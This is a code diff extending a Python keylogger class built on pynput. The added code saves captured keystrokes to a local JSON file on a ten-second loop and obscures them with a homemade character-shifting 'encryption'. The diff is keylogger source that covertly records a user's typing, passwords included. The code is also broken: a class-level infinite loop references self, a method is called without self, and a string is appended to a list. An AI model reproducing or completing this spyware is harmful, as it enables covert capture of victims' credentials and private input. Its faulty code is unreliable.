@@ -1,4 +1,9 @@
+
 from pynput import keyboard
+import json
+import os
+import time
+from datetime import datetime
 
 class KeyLogger:
     def __init__(self):
@@ -23,3 +28,34 @@ class KeyLogger:
                 self.logger += "\t"
             else:
                 self.logger += str(key)
+
+    def write_of_file(self):
+        try:
+            with open("my_keylogger.json","r") as f:
+                data = json.load(f)
+            if isinstance(data,list):
+                data += self.logger
+                os.remove("my_keylogger.json")
+                write_of_file(data)
+            else:
+                data = self.logger
+        except:
+            with open("my_keylogger.json","w") as f:
+                json.dump(self.logger, f, indent=4)
+                self.logger = ""
+    while True:
+        time.sleep(10)
+        write_of_file(self.logger)
+
+
+    def encryption(self):
+        array_encryption = ""
+        for word in self.logger:
+            nem = ord(word)+2
+            nem = (nem ** 2)//65
+            if nem > 122:
+                nem -= 57
+            array_encryption += (chr(nem))
+        return array_encryption
+
+
